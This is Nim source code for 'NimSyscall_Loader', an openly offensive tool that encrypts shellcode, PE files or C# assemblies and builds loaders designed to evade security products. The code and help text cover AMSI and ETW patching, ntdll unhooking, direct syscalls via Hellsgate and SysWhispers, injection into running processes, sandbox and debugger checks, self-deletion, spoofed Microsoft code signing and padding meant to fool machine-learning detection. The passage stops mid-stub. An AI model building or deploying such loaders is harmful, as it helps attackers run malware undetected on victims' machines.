#[

    Author: Fabian Mosch, Twitter: @ShitSecure
    Inspiration from: https://github.com/icyguider/nimcrypt/blob/main/nimcrypt.nim
]#

import nimcrypto
import nimcrypto/sysrand
import strformat
import strutils
import sugar
import os
import osproc
import docopt
import random
import base64
import winim
import streams
when system.hostOS == "windows":
    import winim/clr except `[]`

import HellsgateStubs
import CustomEvasionStubs
import GetSyscallStubs
import SandboxStubs
import Whispers
import SleepyCryptSleep
import PELoad
import CurrentProcInject
import RemoteProcInject


from system import io

func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

proc rndStr(length: int): string =
  for _ in .. length:
    add(result, char(rand(int('a') .. int('z'))))

# When this function isn't called, all random functions are not random. (https://nim-lang.org/docs/random.html)
randomize()


let banner = """
    _   ___          _____                       ____     __                    __         
   / | / (_)___ ___ / ___/__  ________________ _/ / /    / /   ____  ____ _____/ /__  _____
  /  |/ / / __ `__ \\__ \/ / / / ___/ ___/ __ `/ / /    / /   / __ \/ __ `/ __  / _ \/ ___/
 / /|  / / / / / / /__/ / /_/ (__  ) /__/ /_/ / / /    / /___/ /_/ / /_/ / /_/ /  __/ /    
/_/ |_/_/_/ /_/ /_/____/\__, /____/\___/\__,_/_/_/____/_____/\____/\__,_/\__,_/\___/_/     
                       /____/                   /_____/      --> @ShitSecure
                                                                 v1.6                                            

"""

echo banner

#Handle arguments

let helpmenu = """
NimSyscall_Loader v 1.6

Usage:
  NimSyscall_Loader --file=file_to_encrypt [--key=<key> --output=<output> --large --noRES --dll --dllexportfunc=<exportfuncname> --arguments=<Hardcoded_Arguments> --csharp --noAMSI --noETW --AMSIProviderPatch --sleep=<10> --shellcode --localCreateThread --COMVARETW --remoteinject --customprocess=<processname> --remoteprocess=<processnames> --remotepatchAMSI --remotepatchETW --unhook --reflective --obfuscate --hide --APIhide --noArgs --peinject --peload --hellsgate --syswhispers --jump --sgn --replace --self-delete --sandbox=<check1,check2>, --domain=<targetdomain> --pump=<words,size> --obfuscatefunctions --debug --verbose --noDInvoke --x86 --llvm --sign --signdomain=<exampledomain> --antidebug --sleepycrypt --fluctuate]
  NimSyscall_Loader (-h | --help)
  NimSyscall_Loader --version

Options:

[general]

  -h --help     Show this screen.
  --version     Show version.
  --file filename  File to encrypt.
  --key key     Key to encrypt with
  --output filename    Filename for encrypted exe/dll
  --arguments hardcodedArgs  compile the following arguments to the encrypted exe/dll
  --noRES    Don't set custom resource file information (cmd icon, CMD description by default)
  --dll     Generate DLL instead of an exe
  --dllexportfunc exportfuncname    Comma separated names of DLL custom export functions
  --noETW    Don't use ETW Patch
  --noAMSI    Don't patch AMSI
  --noArgs    Don't provide any arguments to the assembly (some can only run without args)
  --hide    Compile with --app:gui flag, so that the console won't pop up
  --APIhide    Console won't pop up, hidden via API calls 'GetConsoleWindow' and 'ShowWindow' with 'SW_HIDE'
  --reflective    Set compiler flags, so that the Loader Nim binary can be reflectively loaded
  --debug    Compiles the binary in debug mode
  --x86    (Compiles an x86 binary - have to cast some more function values before this works smoothly)
  --large    use this for large payloads (bigger than 5MB) as you will get an error "interpretation requires too many iterations" without it
  --noDInvoke    Don't use DInvoke - some older Windows OS Versions may crash when DInvoke is in use, e.g. Windows Server 2012. If you get "SIGSEGV: iilegal storage access. (Attempt to read from nil?)" try to use this option.
  --verbose    Prints output to the console (for troubleshooting purposes)

[evasion]

  --sleep 10    Sleep 10 seconds before decryption to evade in memory scanners
  --COMVARETW    Block ETW by setting COMPlus_ETWEnabled to 0
  --unhook    Unhook ntdll.dll before doing anything else for the current process
  --obfuscate    Compile the Nim binary via Denim to make use of LLVM obfuscation
  --sgn    Encode shellcode via SGN before encrypting it´
  --replace    Replace common nim IoC's in the loader like the string 'nim'
  --AMSIProviderPatch    Patch all AMSI Providers instead of 'amsi.dll' (https://i.blackhat.com/Asia-22/Friday-Materials/AS-22-Korkos-AMSI-and-Bypass.pdf)
  --sandbox value    Include Sandbox Checks of your choice into the loader:
                     Domain -> Only execute if the target domain is == the --domain parameter's domain / If --domain is not set, it will only execute on non-domain joined systems
                     DomainJoined -> Only execute if the target is connected to ANY domain - you don't need to know the target's domain for this one
                     DiskSpace -> Only execute if c:\ disk space >= 200GB
                     MemorySpace -> Only execute if more than 4GB RAM available
                     Emulated -> VirtualAllocExNuma API call (Some sandboxes do not emulate that)
                     WindowChanges -> Checks, if the current Window has changed 7 or more times before executing the payload
        --domain targetdomain    Specify a domain for SandBox Evasion
  --pump value    Pump the file with:
                  words -> english dictionary words to increase the reputation for "mashine learning" evasion (https://twitter.com/hardwaterhacker/status/1502425183331799043)
                  reputation -> Pump reputation with strings from well known binaries e.g. Chrome,Cortana,Discord and some others
  --self-delete    The loader deletes it's own executable on runtime (Credit to @byt3bl33d3r and @jonasLyk)
  --obfuscatefunctions    Obfuscate some Nim specific Windows API's from the IAT via CallObfuscator (https://github.com/d35ha/CallObfuscator - only possible from a Windows OS)
  --sign    Sign the binary with a spoofed certificate
      --signdomain www.example.com    The domain to use for the certificate (default is www.microsoft.com)
  --llvm    Add compiler flags for LLVM obfuscation, you have to set it up by yourself
  --sleepycrypt    Encrypt the memory of the loader with SleepyCrypt # experimental (Pre-Alpha, not working yet for C2-Stager)
  --fluctuate    Enable ShellcodeFluctuation for local shellcode injection and PE-Loading (Alpha) - no support for remote injection
                 This will only work for C2-Payloads, that use Win32 Sleep in between connection attempts, as that is hooked
  --antidebug    Checks the BeingDebugged flag of the current process and if it is set, it will quit

[Syscall retrival technique to use, default is GetSyscallStub to retrievethe stubs from disk]

  --hellsgate    Retrieve Syscalls via Hellsgate technique (for patching AMSI/ETW or shellcode execution/PE injection)
  --syswhispers    Embed Syscalls via Syswhispers3 (NimLineWhispers3) technique
        --jump    When using Syswhispers3, use the jumper_randomized technique

[shellcode specific]

  --shellcode    Encrypt shellcode to load it on runtime
  --localCreateThread    Use NtCreateThreadEx for local injection instead of a direct pointer to the shellcode
  --remoteinject    Inject shellcode a newly spawned process (default notepad) / otherwise it's self injection
      --customprocess procname    Spawn a custom process (instead of notepad) for remote injection
      --remoteprocess procname    Injects into the specified (existing) remote process name, e.g. teams.exe. The loader searches for the first process with that name
                         Can be used for multiple process names, e.g. --remoteprocess=teams.exe,iexplore.exe,MicrosoftEdge.exe -> First try teams, else Internet Explorer, last Edge
      --remotepatchAMSI    Patch AMSI in the remote process before shellcode execution
      --remotepatchETW    Patch ETW in the remote process before shellcode execution
  
[PE Packing]

  --peinject    Encrypt a PE to decrypt and run it on runtime as shellcode via donut
  --peload    Encrypt a PE to decrypt it on runtime and execute it via a syscall variant of Run-PE

[C# assembly Packing]

  --csharp    Encrypt a C# assembly to load it on runtime

"""

if (paramCount() == 0):
    echo helpmenu
    quit(0)
if (paramStr(1) == "-h"):
    echo helpmenu
    quit(0)

proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))

var 
    filename: string = ""
    packerPath = os.getAppDir()
    outfile: string = packerPath
    envkey: string = rndStr(rand(10..35))
    dll_out: bool = false
    dllfunc: string = ""
    dllexportfunctions: seq[string]
    big: bool
    remoteprocesses : seq[string]
    targetdomain : string = ""
    processname: string = ""
    customspawnprocess: string = "notepad.exe"
    sandboxcheckfmt: string = ""
    sandboxchecks: seq[string]
    sandbox: bool = false
    csharp: bool = false
    arguments: string = ""
    embeddedArguments : bool = false
    AMSI: bool = true
    AMSIProviderPatch: bool = false
    ETW: bool = true
    COMVARETW: bool = false
    shellcode: bool = true
    localCreateThread: bool = false
    localinject: bool = true
    unhook: bool = false
    verbose: bool = false
    denim: bool = false
    llvm: bool = false
    gosleep: bool = false
    sleeptime: int = 0
    reflective: bool = false
    hide: bool = false
    apiHide: bool = false
    noArgs: bool = false
    peinject: bool = false
    peload: bool = false
    callobfs: bool = false
    hellsgate: bool = false
    syswhispers: bool = false
    jump: bool = false
    sgn: bool = false
    getfreshstub: bool = true
    selfdelete: bool = false
    remoteAMSIpatch: bool = false
    remoteETWpatch: bool = false
    replace: bool = false
    pump: bool = false
    pumpfmt: string = ""
    pumpargs: seq[string]
    debugMode: bool = false
    sign: bool = false
    signdomain: string = "www.microsoft.com"
    compileX86: bool = false
    noassembly: bool = false
    sleepycrypt: bool = false
    fluctuate: bool = false
    noDInvoke: bool = false
    noRES: bool = true
    antidebug: bool = false

let args = docopt(helpmenu, version = "NimSyscall_Loader 1.6")

if args["--file"]:
  let fname = args["--file"]
  filename = fmt"{fname}"
  echo filename

if args["--key"]:
  let keyname = args["--key"]
  envkey = fmt"{keyname}"

if args["--arguments"]:
  let argsForPE = args["--arguments"]
  arguments = fmt"{argsForPE}"
  embeddedArguments = true

if args["--shellcode"]:
  shellcode = true
  csharp = false
  peload = false

if args["--localCreateThread"]:
    localCreateThread = true

if args["--csharp"]:
  csharp = true
  shellcode = false
  peload = false

if args["--peload"]:
  peload = true
  shellcode = false
  csharp = false

if args["--dll"]:
  dll_out = true
  if peload == true:
    echo "Warning: Argument passing to the PE will fail as the first argument is rundll32.exe or regsvr32.exe"

if args["--dllexportfunc"]:
  let dllfuncstring = args["--dllexportfunc"]
  dllfunc = fmt"{dllfuncstring}"
  dllexportfunctions = dllfunc.split(',')

var customLoaderName: string = rndStr(rand(5..15))

when system.hostOS == "windows":
    if(dll_out):
        outfile.add(fmt"\\{customLoaderName}.dll")
    else:
        outfile.add(fmt"\\{customLoaderName}.exe")
else:
    if(dll_out):
        outfile.add(fmt"/{customLoaderName}.dll")
    else:
        outfile.add(fmt"/{customLoaderName}.exe")

if args["--output"]:
  let outname = args["--output"]
  outfile = fmt"{outname}"

if args["--noRES"]:
  noRES = false

if args["--remotepatchAMSI"]:
  remoteAMSIpatch = true

if args["--remotepatchETW"]:
  remoteETWpatch = true

if args["--noAMSI"]:
  AMSI = false

if args["--AMSIProviderPatch"]:
  AMSIProviderPatch = true
  AMSI = false

if args["--noETW"]:
  ETW = false

if args["--large"]:
  big = true

if args["--COMVARETW"]:
  COMVARETW = true

if args["--unhook"]:
  unhook = true

if args["--sleep"]:
  sleeptime = parse_int($args["--sleep"])
  sleeptime = (sleeptime)
  gosleep = true

if args["--remoteinject"]:
  localinject = false

if args["--customprocess"]:
  let customprocargs = args["--customprocess"]
  customspawnprocess = fmt"{customprocargs}"

if args["--remoteprocess"]:
  let remoteprocessesstring = args["--remoteprocess"]
  processname = fmt"{remoteprocessesstring}"
  echo processname
  remoteprocesses = processname.split(',')
  echo remoteprocesses

if args["--reflective"]:
  reflective = true

if args["--obfuscate"]:
  denim = true

if args["--sign"]:
    sign = true

if args["--signdomain"]:
    let signarg = args["--signdomain"]
    signdomain = fmt"{signarg}"

if args["--llvm"]:
  llvm = true

if args["--sleepycrypt"]:
    sleepycrypt = true

if args["--fluctuate"]:
    fluctuate = true

if args["--hide"]:
  hide = true

if args["--APIhide"]:
  apihide = true
  hide = false

if args["--noArgs"]:
  noArgs = true

if args["--peinject"]:
  peinject = true

if args["--hellsgate"]:
  hellsgate = true
  getfreshstub = false

if args["--syswhispers"]:
  syswhispers = true
  getfreshstub = false

if args["--jump"]:
  syswhispers = true
  jump = true

if args["--sgn"]:
  sgn = true

if args["--replace"]:
  replace = true

if args["--sandbox"]:
  sandbox = true
  let sandboxchecksargs = args["--sandbox"]
  sandboxcheckfmt = fmt"{sandboxchecksargs}"
  sandboxchecks = sandboxcheckfmt.split(',') 

if args["--pump"]:
  pump = true
  let pumptempargs = args["--pump"]
  pumpfmt = fmt"{pumptempargs}"
  pumpargs = pumpfmt.split(',') 

if args["--domain"]:
  let domainarg = args["--domain"]
  targetdomain = fmt"{domainarg}"

if args["--self-delete"]:
  selfdelete = true

if args["--obfuscatefunctions"]:
  callobfs = true

if args["--debug"]:
  debugMode = true

if args["--antidebug"]:
  antidebug = true

if args["--x86"]:
  compileX86 = true

if args["--verbose"]:
  verbose = true

if args["--noDInvoke"]:
  noDInvoke = true

var blob: string

if (noArgs and embeddedArguments):
    echo "Error: Cannot use both --noArgs and --arguments"
    quit(1)
if (peinject and peload):
    echo "Error: Cannot use both --peinject and --peload"
    quit(1)

if (syswhispers and hellsgate):
    echo "Error: Cannot use both --syswhispers and --hellsgate"
    quit(1)

if (hellsgate and jump):
    echo "Error: Cannot use both --hellsgate and --jump! --jump can only be used with --syswhispers"
    quit(1)

if ((csharp and shellcode) or (csharp and peload) or (csharp and peinject) or (peload and shellcode)):
    echo "Error: You can only use one of --csharp, --shellcode, --peload, or --peinject!"
    quit(1)
if (peload or peinject):
    let stream = newFileStream(filename, mode = fmRead)
    defer: stream.close()
    # Check magic string
    var magic_string: array[2, char]
    discard stream.readData(magic_string.addr, 2)
    if magic_string != "MZ":
        echo "[-] No Magic bytes found, file is not a PE"
        quit(1)
when system.hostOS == "windows":
    if (csharp):
        blob = readFile(filename)
        var blobbytes = toByteSeq(blob)
        var code = fmt"""
        using System;
        public class Check {{
          public void ifAssembly() {{
            object asd = System.Reflection.AssemblyName.GetAssemblyName(@"{filename}");
          }}
        }}
        """
        try:
            var res = compile(code)
            var o = res.CompiledAssembly.new("Check")
            o.ifAssembly()
        except:
            echo "[-] Error - you didn't specify a C# assembly!"
            noassembly = true

    if (noassembly):
        quit(1)

#Read file and if PE convert to shellcode before
if (peinject):
    when system.hostOS == "windows":
        var exist: bool = fileExists(fmt"{packerPath}\donut\donut.exe")
    else:
        var exist: bool = true
    if (exist):
        when system.hostOS == "windows":
            discard os.execShellCmd(fmt"{packerPath}\donut\donut -b 1 -o tmpshellcode.bin --input:{filename}")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        elif system.hostOS == "linux":
            discard os.execShellCmd(fmt"donut {filename} -b 1 -o tmpshellcode.bin")
            if (sgn):
                if (compileX86):
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                else:
                    discard os.execShellCmd(fmt"{packerPath}\sgn\sgn -a 64 -c 3  -o tmpshellcode.bin tmpshellcode.bin")
                sgn = false
        blob = readFile("tmpshellcode.bin")
        shellcode = true
        peload = false
    else:
        echo fmt"'Donut' not found. You need to download/install according to the README"
        quit()
elif(sgn):
    if (compileX86):
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -c 3  -o tmpshellcode.bin {filename}")
    else:
        discard os.execShellCmd(fmt"{packerPath}\sgn\sgn.exe -a 64 -c 3  -o tmpshellcode.bin {filename}")
    blob = readFile("tmpshellcode.bin")
else:
    blob = readFile(filename)

var
    data: seq[byte] = toByteSeq(blob)

    ectx: CTR[aes256]
    key: array[aes256.sizeKey, byte]
    iv: array[aes256.sizeBlock, byte]
    plaintext = newSeq[byte](len(data))
    enctext = newSeq[byte](len(data))

# Create Random IV
discard randomBytes(addr iv[0], 16)

# We do not need to pad data, `CTR` mode works byte by byte.
copyMem(addr plaintext[0], addr data[0], len(data))

# Expand key to 32 bytes using SHA256 as the KDF
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

ectx.init(key, iv)
ectx.encrypt(plaintext, enctext)
ectx.clear()

#let encoded = encode(enctext)
let encodedIV = encode(iv)
echo "Writing encrypted blob to disk: "

var content: string = cast[string](enctext)
writeFile("enc.blob", content)


let PatchargsFuncs = fmt"""
var arguments: string = "{arguments}"
when defined(args):
    proc patchMemory*(targetAddr: PVOID, data: openArray[byte]): void =
        var oldProtect: DWORD = 0
        var lpAddress = targetAddr
        var dwSize = cast[SIZE_T](len(data))
        var status: NTSTATUS = 0x00000000
        when defined(DInvoke):
            var hProcess = MyGetCurrentProcess()
        else:
            var hProcess = GetCurrentProcess()
        when defined(Syswhispers):
            status =  uashdiasdj(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
            when defined(verbose):
                echo obf("NtProtectVirtualMemory: "),toHex(status)
            if (status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to change memory protections.")
                when defined(verbose):
                    echo toHex(status)
        else:
            when defined(HellsGate):
                if getSyscall(ntProtectTable):                
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            status =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,0x40, addr oldProtect)
            if (status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to change memory protections.")
                    echo toHex(status)
            
        when defined(Hellsgate):
            if getSyscall(ntWriteTable):
                syscall = ntWriteTable.wSysCall
            else:
                when defined(verbose):
                    echo obf("[-] Failed to find opcode for NtWriteVirtualMemory")
        var scLength: SIZE_T = SIZE_T(len(data))
        var bytesWritten: SIZE_T
            
        when defined(Syswhispers):
            status = oqiazasusjk(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
        else:
            status = NtWriteVirtualMemory(hProcess,targetAddr,unsafeAddr data[0],scLength,addr bytesWritten)
            when defined(verbose):
                echo obf("NtWriteVirtualMemory: "),toHex(status)
            if (status != 0):
                when defined(verbose):
                    echo obf("[-] Failed to write arguments.")
                when defined(verbose):
                    echo toHex(status)
            else:
                when defined(verbose):
                    echo obf("[+] Arguments written successfully.")
        when defined(Syswhispers):
            status = uashdiasdj(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
        else:
            when defined(HellsGate):
                if getSyscall(ntProtectTable):                
                    syscall = ntProtectTable.wSysCall
                else:
                    when defined(verbose):
                        echo obf("[-] Failed to find opcode for NtProtectVirtualMemory")
            success =  NtProtectVirtualMemory(hProcess, addr lpAddress, addr dwSize ,oldProtect, addr oldProtect)
when defined(args):
    proc patchArgFunctionMemory*(funcAddr: pointer, pNewCommandLine: pointer): void =
        when defined x86:
            var shellcode: seq[byte] = @[byte(0xb8)] # movabs rax, new_cmd
        else:
            var shellcode: seq[byte] = @[byte(0x48), byte(0xb8)] # movabs rax, new_cmd
        for t in cast[array[sizeOf(pointer), byte]](pNewCommandLine):
            shellcode.add t        
        shellcode.add(byte(0xc3)) # ret
        patchMemory(funcAddr, shellcode)
"""


let RemoteProcImportStub = """
import osproc
"""

let AssemblyImports = """
import winim/clr
from winim/clr import toCLRVariant,invoke,load,`.`,VT_BSTR
"""

let LoadAssemblyStub = fmt"""
var assembly = load(dectext)

from os import paramCount,paramStr

when defined(lib_only):
    # https://stackoverflow.com/questions/12161813/running-a-dll-using-rundll32-exe-no-output-or-error-seen
    # https://stackoverflow.com/questions/432832/what-is-the-different-between-api-functions-allocconsole-and-attachconsole-1 to get DLL Console output
    AttachConsole(-1)

when defined(Fluctuate):
    g_fluctuationData.shellcodeAddr = dectext[0].addr
    g_fluctuationData.shellcodeSize = SIZE_T(dectext.len)
    # Will change the hardcoded key later on
    when defined(amd64):
        g_fluctuationData.encodeKey = 0x1337DE4D
    when defined(i386):
        g_fluctuationData.encodeKey = 0x1337
    g_fluctuationData.currentlyEncrypted = false
    g_fluctuationData.protect = PAGE_READWRITE
    g_fluctuate = FluctuateToRW
    if (hookSleep()):
        when defined(verbose):
            echo obf("Hooked Sleep successfully for Shellcode-Fluctuation!")
    else:
        when defined(verbose):
            echo obf("Failed to hook Sleep for Shellcode-Fluctuation!")

var cmd: seq[string]
var i = 1
when defined(args):
    cmd.add({arguments.split(" ")})
while i <= paramCount():
    when defined(lib_only):
        if (i != 1):
            # first parameter is rundll32.exe,Funcname (skip that)
            cmd.add(paramStr(i))
    else:
        cmd.add(paramStr(i))
    inc(i)
"""

let LoadAssemblyStubArgs = """
var arr = toCLRVariant(cmd, VT_BSTR)
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let LoadAssemblyStubNoArgs = """
var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))
"""

let WinLeanGetCurrentProcStub = """
from winlean import getCurrentProcess

"""

let Winimleanstub = """
import winim/lean
"""

let SleepStubSecond * = fmt"""
when defined(verbose):
    echo obf("[*] Sleeping to avoid in memory scanners")
when defined(verbose):
    echo {sleeptime}
HowMuchTimeWouldYoulikeToSleep({sleeptime}) 
"""

let DomainCheckStub1 * = fmt"""
when isMainModule:
    var localdomain: string = getDomain()
    if(localdomain != "{targetdomain}"):
        when defined(verbose):
            echo obf("Domain not EQUAL, target / local :") & $localdomain & " / {targetdomain}"
        quit()
"""

let ShellcoderemoteinjectStub_customprocseccond * = fmt"""
var remoteprocesses: seq[string] = {remoteprocesses}
"""

let Cryptstub1 = """
import winim/lean
#from dynlib import LibHandle, loadLib
# something seams to be still missing here
#from winim/lean import ULONG, PVOID, SIZE_T, PSIZE_T, DWORD_PTR,LPDWORD,WINBOOL,TRUE,FALSE,HMODULE,LPOVERLAPPED, PIMAGE_SECTION_HEADER, LPCSTR, LPVOID, HANDLE, DWORD, GENERIC_READ, FILE_SHARE_READ, LPSECURITY_ATTRIBUTES, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, PIMAGE_DOS_HEADER, PIMAGE_NT_HEADERS, IMAGE_DIRECTORY_ENTRY_EXPORT, IMAGE_FIRST_SECTION, IMAGE_SIZEOF_SECTION_HEADER, PIMAGE_EXPORT_DIRECTORY, PDWORD, BOOL, PULONG, NTSTATUS, PROCESS_ALL_ACCESS, FALSE, MEM_COMMIT, PAGE_EXECUTE_READ_WRITE, PAGE_READWRITE, CLIENT_ID, OBJECT_ATTRIBUTES
#from winim/lean import FARPROC,NtClose
#from winim import winstr,winimbase,windef
import strformat
from nimcrypto import CTR, aes256, sizeKey, sizeBlock, sha256, digest, init, update, finish, clear, decrypt, encrypt
import strutils
import base64
import ptr_math
import strenc
when defined(Fluctuate):
    import Fluctuation

when defined(DInvoke):
    import DInvoke

var success: BOOL

const encstring = slurp"enc.blob"

proc toString(bytes: openarray[byte]): string =
  result = newString(bytes.len)
  copyMem(result[0].addr, bytes[0].unsafeAddr, bytes.len)

### Modified code from Nim-Strenc to avoid XORing of long strings -> Modified by @chvancooten, credit to him
### Original source: https://github.com/Yardanico/nim-strenc
import macros, hashes

type
    estring = distinct string

proc calcTheThings(s: estring, key: int): string {.noinline.} =
    var k = key
    result = string(s)
    for i in 0 ..< result.len:
        for f in [0, 8, 16, 24]:
            result[i] = chr(uint8(result[i]) xor uint8((k shr f) and 0xFF))
    k = k +% 1

var eCtr {.compileTime.} = hash(CompileTime & CompileDate) and 0x7FFFFFFF

macro obf*(s: untyped): untyped =
    if len($s) < 10000:
        var encodedStr = calcTheThings(estring($s), eCtr)
        result = quote do:
            calcTheThings(estring(`encodedStr`), `eCtr`)
        eCtr = (eCtr *% 16777619) and 0x7FFFFFFF
    else:
        result = s

# Decrypt.nim
func toByteSeq*(str: string): seq[byte] {.inline.} =
  ## Converts a string to the corresponding byte sequence.
  @(str.toOpenArrayByte(0, str.high))

var dctx: CTR[aes256]
"""

let Cryptstub2 = fmt"""
var enctext: seq[byte] = toByteSeq(encstring)
var key: array[aes256.sizeKey, byte]
var envkey: string = obf("{envkey}")
var iv: array[aes256.sizeBlock, byte]
var pp: string = decode(obf("{encodedIV}"))
"""

let Cryptstub3 = fmt"""
# Decode and save IV
copyMem(addr iv[0], addr pp[0], len(pp))

# Encrypt Key
var expandedkey = sha256.digest(envkey)
copyMem(addr key[0], addr expandedkey.data[0], len(expandedkey.data))

var dectext = newSeq[byte](len(enctext))

# Decrypt
dctx.init(key, iv)
dctx.decrypt(enctext, dectext)
dctx.clear()

"""

let RemoteModuleHandleStub = """

# Credit to @whydee86 - https://github.com/whydee86/SnD_AMSI/blob/main/Remote.nim

from winim import PROCESSENTRY32A,CreateToolhelp32Snapshot,TH32CS_SNAPPROCESS,PROCESSENTRY32,Process32FirstA,Process32NextA,MODULEENTRY32A,TH32CS_SNAPMODULE,Module32FirstA,Module32NextA

proc ConvertToString(CharArr :array[256,char]): string =
    var index = 0
    while CharArr[index] != '\x00':
        result.add(CharArr[index])
        index += 1

proc GetRemoteModuleHandle * (hProcess:HANDLE, ModuleName: string): HMODULE =
    var 
        modEntry : MODULEENTRY32A
        snapshot : HANDLE

    snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPMODULE,GetProcessId(hProcess))
    if snapshot != INVALID_HANDLE_VALUE:
        modEntry.dwSize = DWORD(sizeof(MODULEENTRY32A))
        if Module32FirstA(snapshot, addr modEntry):
            while Module32NextA(snapshot, addr modEntry):
                if ConvertToString(modEntry.szModule) == ModuleName:
                    return modEntry.hModule
    CloseHandle(snapshot)
    return 0

proc GetRemoteProcAddress * (hProcess : HANDLE, hModule : HMODULE, FuncName : string): FARPROC =
    var
        baseModule : UINT_PTR = cast[UINT64](hModule)
        dosHeader : IMAGE_DOS_HEADER
        ntHeader : IMAGE_NT_HEADERS
        exportDirectory : IMAGE_EXPORT_DIRECTORY
        ExportTable : DWORD = 0
        ExportFunctionTableVA : UINT_PTR = 0
        ExportNameTableVA : UINT_PTR = 0
        ExportOrdinalTableVA : UINT_PTR = 0
        ExportNameTable: seq[DWORD]
        ExportFunctionTable: seq[DWORD]
        ExportOrdinalsTable: seq[WORD] 
        MinFunNumber : UINT_PTR = 0
        Func : DWORD = 0
        Ord : WORD = 0
        CharIndex : UINT_PTR = 0
        TempChar : char
        Done : bool = false
        TempFunctionName : string = ""

    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule), addr dosHeader, sizeof(dosHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the DOS header and check it's magic number: "), GetlastError()
        return NULL
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + dosHeader.e_lfanew), addr ntHeader, sizeof(ntHeader), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read and check the NT signature: "), GetlastError()
        return NULL

    ExportTable = (ntHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT]).VirtualAddress
    
    if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportTable), addr exportDirectory, sizeof(exportDirectory), NULL) == 0:
        when defined(verbose):
            echo obf("Failed to Read the main export table "), GetlastError()

    ExportFunctionTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfFunctions
    ExportNameTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNames
    ExportOrdinalTableVA = cast[UINT_PTR](baseModule) + exportDirectory.AddressOfNameOrdinals
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        Func = 0
        Ord = 0 
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportNameTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy name table "), GetlastError()
            return NULL
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportOrdinalTableVA + FunNum * sizeof(WORD)), addr Ord, sizeof(Ord), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy Ordinal table "), GetlastError()
            return NULL
        ExportNameTable.add(Func)
        ExportOrdinalsTable.add(Ord)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfFunctions:
        Func = 0
        if ReadProcessMemory(hProcess, cast[LPCVOID](ExportFunctionTableVA + FunNum * sizeof(DWORD)), addr Func, sizeof(Func), NULL) == 0:
            when defined(verbose):
                echo obf("Failed to copy fucntion table "), GetlastError()
            return NULL
        ExportFunctionTable.add(Func)
    
    for FunNum in MinFunNumber .. exportDirectory.NumberOfNames:
        CharIndex = 0
        Done = false
        TempFunctionName = ""
        while Done == false:
            if ReadProcessMemory(hProcess, cast[LPCVOID](baseModule + ExportNameTable[FunNum] + CharIndex), addr TempChar, sizeof(TempChar), NULL) == 0:
                when defined(verbose):
                    echo obf("Failed to read the names of the functions"), GetlastError()
                return NULL
            if TempChar == '\0' or TempChar == '`' or TempChar == '\176':
                Done = true
            else:
                TempFunctionName.add(TempChar)
            CharIndex += 1
        if TempFunctionName == FuncName:
            return cast[FARPROC](baseModule + ExportFunctionTable[ExportOrdinalsTable[FunNum]])
    when defined(verbose):
        echo obf("[X] Proc name does not exits")
    return NULL

"""


proc genEnglishwords (nuofWords: int): string =

  proc pumpenglishwords (numberofWords: int): seq[string] =

    var englishdicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\englishwords.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/englishwords.txt"
    for line in lines dictionary:
      englishdicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(englishdicts))
    return output

  proc rndStr: string =
    for _ in 0.. 10:
      add(result, char(rand(int('a') .. int('z'))))
    
  var rand1: seq[string] = pumpenglishwords(nuofWords)
  var rand2: string = rndStr()

  let englishwordsstub = fmt"""

var {rand2} = {rand1}

"""
  return englishwordsstub


proc genTrustedwords (nuofWords: int): string =

  proc pumpTrustedwords (numberofWords: int): seq[string] =

    var trusteddicts: seq[string]
    var output: seq[string]
    var dictionary: string
    when system.hostOS == "windows":
        dictionary = fmt"{packerPath}\\Dicts\\trustedStrings.txt"
    else:
        dictionary = fmt"{packerPath}/Dicts/trustedStrings.txt"
    for line in lines dictionary:
      trusteddicts.add(line)
    for i in 1 .. numberofWords:
      output.add(sample(trusteddicts))
    return output
    
  var rand1: seq[string] = pumpTrustedwords(nuofWords)
  var rand2: string = rndStr()

  let trustedwordsstub = fmt"""

var {rand2} = {rand1}

"""

  return trustedwordsstub

let DllStub = """
import dynlib
proc NimMain() {.cdecl, importc.}

